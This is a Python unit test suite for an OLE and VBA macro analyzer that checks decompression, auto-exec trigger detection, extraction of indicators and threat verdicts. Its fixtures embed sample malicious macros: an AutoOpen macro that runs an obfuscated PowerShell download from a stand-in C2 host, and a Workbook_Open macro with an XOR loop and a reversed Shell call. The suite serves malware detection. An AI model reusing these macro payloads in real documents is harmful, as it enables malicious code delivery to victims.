"""Unit test suite for OLE Compound Document and MS-OVBA Macro Analyzer."""

import io
import struct

from eft.analysis.ole_analyzer import (
    OLEMacroAnalyzer,
    decompress_ms_ovba,
)


def create_synthetic_ole_file(streams: dict) -> bytes:
    """Create a minimal valid OLE compound file containing the specified streams."""
    # Build standard OLE file using olefile or custom header + streams
    out = io.BytesIO()
    # OLE header magic: \xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1
    # We can write an OLE structure or format using standard OLE headers
    # Let's create an in-memory OLE file
    # If olefile does not support direct creation in pure memory, we create standard OLE container bytes
    header = bytearray(512)
    header[:8] = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
    struct.pack_into("<H", header, 24, 0x003E)  # Minor version
    struct.pack_into("<H", header, 26, 0x0003)  # Major version (3 = 512 sector size)
    struct.pack_into("<H", header, 28, 0xFFFE)  # Byte order (little-endian)
    struct.pack_into("<H", header, 30, 9)  # Sector shift (512 bytes)
    struct.pack_into("<H", header, 32, 6)  # Mini sector shift (64 bytes)
    struct.pack_into("<I", header, 44, 1)  # Number of directory sectors
    struct.pack_into("<I", header, 48, 1)  # First directory sector location
    struct.pack_into("<I", header, 68, 0xFFFFFFFE)  # End of mini-stream chain

    out.write(header)

    # Sector 0: FAT sector
    fat_sector = bytearray(512)
    struct.pack_into("<I", fat_sector, 0, 0xFFFFFFFE)  # Sector 0: End of FAT chain
    struct.pack_into("<I", fat_sector, 4, 0xFFFFFFFE)  # Sector 1: Directory sector
    out.write(fat_sector)

    # Sector 1: Directory entries (4 entries * 128 bytes = 512 bytes)
    dir_sector = bytearray(512)
    # Root entry at index 0
    root_name = "Root Entry\x00".encode("utf-16le")
    struct.pack_into(f"<{len(root_name)}s", dir_sector, 0, root_name)
    struct.pack_into("<H", dir_sector, 64, len(root_name))  # Name length
    dir_sector[66] = 5  # Object type: 5 = Root storage
    dir_sector[67] = 1  # Color: 1 = Black
    struct.pack_into("<I", dir_sector, 68, 0xFFFFFFFF)  # Left sibling
    struct.pack_into("<I", dir_sector, 72, 0xFFFFFFFF)  # Right sibling
    struct.pack_into("<I", dir_sector, 76, 1 if streams else 0xFFFFFFFF)  # Child

    # Stream entries
    for i, (name, content) in enumerate(streams.items(), start=1):
        entry_offset = i * 128
        if entry_offset + 128 > 512:
            break
        name_utf16 = (name + "\x00").encode("utf-16le")
        struct.pack_into(f"<{len(name_utf16)}s", dir_sector, entry_offset, name_utf16)
        struct.pack_into("<H", dir_sector, entry_offset + 64, len(name_utf16))
        dir_sector[entry_offset + 66] = 2  # Object type: 2 = User stream
        dir_sector[entry_offset + 67] = 1  # Black
        struct.pack_into("<I", dir_sector, entry_offset + 68, 0xFFFFFFFF)
        struct.pack_into("<I", dir_sector, entry_offset + 72, 0xFFFFFFFF)
        struct.pack_into("<I", dir_sector, entry_offset + 76, 0xFFFFFFFF)
        struct.pack_into("<I", dir_sector, entry_offset + 116, len(content))  # Stream size

    out.write(dir_sector)
    return out.getvalue()


def test_non_ole_document_rejection():
    """Verify non-OLE documents are rejected cleanly."""
    analyzer = OLEMacroAnalyzer()
    res = analyzer.analyze(b"PK\x03\x04" + b"\x00" * 200)
    assert not res.is_ole_compound_document
    assert res.threat_score == 0.0
    assert res.verdict == "BENIGN"


def test_ms_ovba_decompression():
    """Verify MS-OVBA decompression algorithm on literal and compressed streams."""
    # Test plain text fallback
    plain_macro = b'Attribute VB_Name = "Module1"\nSub Test()\n  MsgBox "Hello"\nEnd Sub'
    decomp = decompress_ms_ovba(plain_macro)
    assert "Sub Test()" in decomp

    # Test compressed stream with 0x01 signature byte
    # Chunk header: uncompressed chunk (bit 15 is 0)
    chunk_data = b'Attribute VB_Name = "TestModule"\nSub AutoOpen()\n  Shell "cmd.exe"\nEnd Sub'
    chunk_size = len(chunk_data) + 3 - 1
    # Little-endian unsigned short with size and 0b011 in bits 12..14 (0x3000), compressed_flag = 0
    chunk_header = (chunk_size & 0x0FFF) | 0x3000
    compressed_stream = b"\x01" + struct.pack("<H", chunk_header) + chunk_data

    decomp_stream = decompress_ms_ovba(compressed_stream)
    assert "AutoOpen" in decomp_stream
    assert "cmd.exe" in decomp_stream


def test_clean_ole_compound_document():
    """Verify clean OLE document without macros."""
    ole_bytes = create_synthetic_ole_file(
        {
            "SummaryInformation": b"\x00" * 128,
            "WordDocument": b"\x00" * 256,
        }
    )

    analyzer = OLEMacroAnalyzer()
    report = analyzer.analyze(ole_bytes)

    assert report.is_ole_compound_document
    assert report.has_vba_macros is False
    assert len(report.vba_streams) == 0
    assert report.threat_score == 0.0
    assert report.verdict == "BENIGN"


def test_malicious_weaponized_vba_macro():
    """Verify detection of auto-exec triggers, shell execution, obfuscation, and C2 URLs in VBA."""
    malicious_vba = (
        'Attribute VB_Name = "EvilMacro"\n'
        "Sub AutoOpen()\n"
        "  Dim c As String\n"
        "  c = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)\n"
        "  Dim url As String\n"
        '  url = "http://malicious-c2-payload.org/beacon.exe"\n'
        "  Dim ip As String\n"
        '  ip = "198.51.100.45"\n'
        '  Set objShell = CreateObject("WScript.Shell")\n'
        "  objShell.Run \"powershell.exe -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('\" & url & \"', 'C:\\temp\\payload.exe')\"\n"
        "End Sub\n"
    ).encode("latin-1")

    # Embed in OLE bytes with signature
    ole_bytes = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 512 + malicious_vba + b"\x00" * 256

    analyzer = OLEMacroAnalyzer()
    report = analyzer.analyze(ole_bytes)

    assert report.is_ole_compound_document
    assert report.has_vba_macros is True
    assert len(report.vba_streams) >= 1

    # Check auto-exec triggers
    assert any("autoopen" in trig.lower() for trig in report.all_auto_exec_triggers)

    # Check extracted network IoCs
    assert "http://malicious-c2-payload.org/beacon.exe" in report.all_extracted_urls
    assert "198.51.100.45" in report.all_extracted_ips

    # Check extracted process execution commands
    assert any("powershell" in cmd.lower() for cmd in report.all_extracted_commands)

    # Check suspicious keywords
    assert any("Shell" in kw or "Process" in kw for kw in report.all_suspicious_keywords)

    # Check threat scoring & verdict
    assert report.threat_score >= 60.0
    assert report.verdict == "MALICIOUS"


def test_obfuscated_vba_xor_detection():
    """Verify detection of XOR loops and character code deobfuscation in VBA."""
    xor_macro = (
        'Attribute VB_Name = "XorPayload"\n'
        "Sub Workbook_Open()\n"
        "  Dim enc As Variant\n"
        "  Dim i As Integer\n"
        "  For i = 0 To UBound(enc)\n"
        "    enc(i) = enc(i) Xor &H5A\n"
        "  Next i\n"
        '  Shell StrReverse("exe.dloyp/metsys/32")\n'
        "End Sub\n"
    ).encode("latin-1")

    ole_bytes = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 256 + xor_macro

    analyzer = OLEMacroAnalyzer()
    report = analyzer.analyze(ole_bytes)

    assert report.is_ole_compound_document
    assert report.has_vba_macros is True
    assert report.has_obfuscation is True
    assert any(
        "Workbook_Open" in trig or "workbook_open" in trig.lower()
        for trig in report.all_auto_exec_triggers
    )
    assert report.threat_score >= 40.0
    assert report.verdict in ("SUSPICIOUS", "MALICIOUS")
